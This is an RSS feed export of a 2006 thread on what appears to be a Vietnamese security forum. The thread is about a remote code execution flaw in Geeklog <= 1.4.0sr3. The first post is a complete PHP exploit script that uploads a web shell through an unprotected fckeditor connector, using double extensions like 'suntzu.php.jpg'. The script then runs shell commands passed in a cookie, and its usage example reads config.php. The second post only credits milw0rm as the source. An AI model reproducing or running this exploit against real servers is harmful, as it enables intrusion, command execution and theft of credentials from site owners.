@@ -1,0 +1,165 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "GeekLog <= 1.4.0sr3 f(u)ckeditor Remote Code Execution Exploit"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "GeekLog <= 1.4.0sr3 f(u)ckeditor Remote Code Execution Exploit"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>GeekLog &amp;lt;= 1.4.0sr3 f(u)ckeditor Remote Code Execution Exploit</title>
+				<description><![CDATA[ <span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#!/usr/bin/php -q -d short_open_tag=on
+&lt;?
+echo "Geeklog &lt;= 1.4.0sr3 'f&#40;u&#41;ckeditor' remote commands execution\n";
+echo "by rgod rgod@autistici.org\n";
+echo "site:<span class="link"> http://retrogod.altervista.org\n</span>";
+
+//works regardless of any php.ini settings,
+//fckeditor &#40;very old 'mcpuk' version...&#41; is enabled by default,
+//and connector.php not protected,
+//you can upload multiple extensions files...
+
+if &#40;$argc&lt;4&#41; {
+echo "Usage: php ".$argv&#91;0&#93;." host path cmd OPTIONS\n";
+echo "host:      target server &#40;ip/hostname&#41;\n";
+echo "path:      path to geeklog\n";
+echo "cmd:       a shell command\n";
+echo "Options:\n";
+echo "   -p&#91;port&#93;:    specify a port other than 80\n";
+echo "   -P&#91;ip:port&#93;: specify a proxy\n";
+echo "Example:\n";
+echo "php ".$argv&#91;0&#93;." localhost / cat ./../../../../config.php\n";
+die;
+}
+error_reporting&#40;0&#41;;
+ini_set&#40;"max_execution_time",0&#41;;
+ini_set&#40;"default_socket_timeout",5&#41;;
+
+function quick_dump&#40;$string&#41;
+{
+  $result='';$exa='';$cont=0;
+  for &#40;$i=0; $i&lt;=strlen&#40;$string&#41;-1; $i++&#41;
+  {
+   if &#40;&#40;ord&#40;$string&#91;$i&#93;&#41; &lt;= 32 &#41; | &#40;ord&#40;$string&#91;$i&#93;&#41; &gt; 126 &#41;&#41;
+   {$result.="  .";}
+   else
+   {$result.="  ".$string&#91;$i&#93;;}
+   if &#40;strlen&#40;dechex&#40;ord&#40;$string&#91;$i&#93;&#41;&#41;&#41;==2&#41;
+   {$exa.=" ".dechex&#40;ord&#40;$string&#91;$i&#93;&#41;&#41;;}
+   else
+   {$exa.=" 0".dechex&#40;ord&#40;$string&#91;$i&#93;&#41;&#41;;}
+   $cont++;if &#40;$cont==15&#41; {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '&#40;\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b&#41;';
+function sendpacketii&#40;$packet&#41;
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if &#40;$proxy==''&#41; {
+    $ock=fsockopen&#40;gethostbyname&#40;$host&#41;,$port&#41;;
+    if &#40;!$ock&#41; {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match&#40;$proxy_regex,$proxy&#41;;
+    if &#40;!$c&#41; {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode&#40;':',$proxy&#41;;
+    echo "Connecting to ".$parts&#91;0&#93;.":".$parts&#91;1&#93;." proxy...\r\n";
+    $ock=fsockopen&#40;$parts&#91;0&#93;,$parts&#91;1&#93;&#41;;
+    if &#40;!$ock&#41; {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs&#40;$ock,$packet&#41;;
+  if &#40;$proxy==''&#41; {
+    $html='';
+    while &#40;!feof&#40;$ock&#41;&#41; {
+      $html.=fgets&#40;$ock&#41;;
+    }
+  }
+  else {
+    $html='';
+    while &#40;&#40;!feof&#40;$ock&#41;&#41; or &#40;!eregi&#40;chr&#40;0x0d&#41;.chr&#40;0x0a&#41;.chr&#40;0x0d&#41;.chr&#40;0x0a&#41;,$html&#41;&#41;&#41; {
+      $html.=fread&#40;$ock,1&#41;;
+    }
+  }
+  fclose&#40;$ock&#41;;
+  #debug
+  #echo "\r\n".$html;
+}
+
+$host=$argv&#91;1&#93;;
+$path=$argv&#91;2&#93;;
+$port=80;
+$proxy="";
+$cmd="";
+for &#40;$i=3; $i&lt;=$argc-1; $i++&#41;{
+$temp=$argv&#91;$i&#93;&#91;0&#93;.$argv&#91;$i&#93;&#91;1&#93;;
+if &#40;&#40;$temp&lt;&gt;"-p"&#41; and &#40;$temp&lt;&gt;"-P"&#41;&#41;
+{$cmd.=" ".$argv&#91;$i&#93;;}
+if &#40;$temp=="-p"&#41;
+{
+  $port=str_replace&#40;"-p","",$argv&#91;$i&#93;&#41;;
+}
+if &#40;$temp=="-P"&#41;
+{
+  $proxy=str_replace&#40;"-P","",$argv&#91;$i&#93;&#41;;
+}
+}
+
+if &#40;&#40;$path&#91;0&#93;&lt;&gt;'/'&#41; or &#40;$path&#91;strlen&#40;$path&#41;-1&#93;&lt;&gt;'/'&#41;&#41; {echo 'Error... check the path!'; die;}
+if &#40;$proxy==''&#41; {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+$shell="&lt;?php echo chr&#40;72&#41;.\"i Master!\";if&#40;get_magic_quotes_gpc&#40;&#41;&#41;{\$_COOKIE&#91;\"cmd\"&#93;=stripslashes&#40;\$_COOKIE&#91;\"cmd\"&#93;&#41;;}";
+$shell.="ini_set&#40;\"max_execution_time\",0&#41;;error_reporting&#40;0&#41;;";
+$shell.="echo \"*delim*\";passthru&#40;\$_COOKIE&#91;\"cmd\"&#93;&#41;;?&gt;";
+$allowed_extensions = array&#40;"zip","doc","xls","pdf","rtf","csv","jpg","gif","jpeg","png","avi","mpg","mpeg","swf","fla"&#41;;
+for &#40;$i=0; $i&lt;=count&#40;$allowed_extensions&#41;-1; $i++&#41;{
+$filename="suntzu.php.".$allowed_extensions&#91;$i&#93;;
+$data="-----------------------------7d529a1d23092a\r\n";
+$data.="Content-Disposition: form-data; name=\"NewFile\"; filename=\"$filename\"\r\n";
+$data.="Content-Type:\r\n\r\n";
+$data.="$shell\r\n";
+$data.="-----------------------------7d529a1d23092a--\r\n";
+$packet="POST ".$p."fckeditor/editor/filemanager/browser/mcpuk/connectors/php/connector.php?Command=FileUpload&Type=File HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen&#40;$data&#41;."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii&#40;$packet&#41;;
+sleep&#40;1&#41;;
+$packet="GET ".$p."images/library/File/".$filename." HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: cmd=".$cmd."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii&#40;$packet&#41;;
+if &#40;eregi&#40;"Hi Master!",$html&#41;&#41;{
+echo"Exploit succeeded...!\n";
+$temp=explode&#40;"*delim*",$html&#41;;
+die&#40;$temp&#91;1&#93;&#41;;}
+}
+//if you are here...
+echo "Exploit failed...";
+?&gt;</pre>
+		</div>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/725.hva#2563</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/725.hva#2563</link>
+				<pubDate><![CDATA[Fri, 30 Jun 2006 12:36:30]]> GMT</pubDate>
+				<author><![CDATA[ anh_that_tinh]]></author>
+			</item>
+			<item>
+				<title>GeekLog &amp;lt;= 1.4.0sr3 f(u)ckeditor Remote Code Execution Exploit</title>
+				<description><![CDATA[ Từ milw0rm à pác :D ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/725.hva#2737</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/725.hva#2737</link>
+				<pubDate><![CDATA[Fri, 30 Jun 2006 22:10:27]]> GMT</pubDate>
+				<author><![CDATA[ +Newbie+]]></author>
+			</item>
+	</channel>
+</rss>
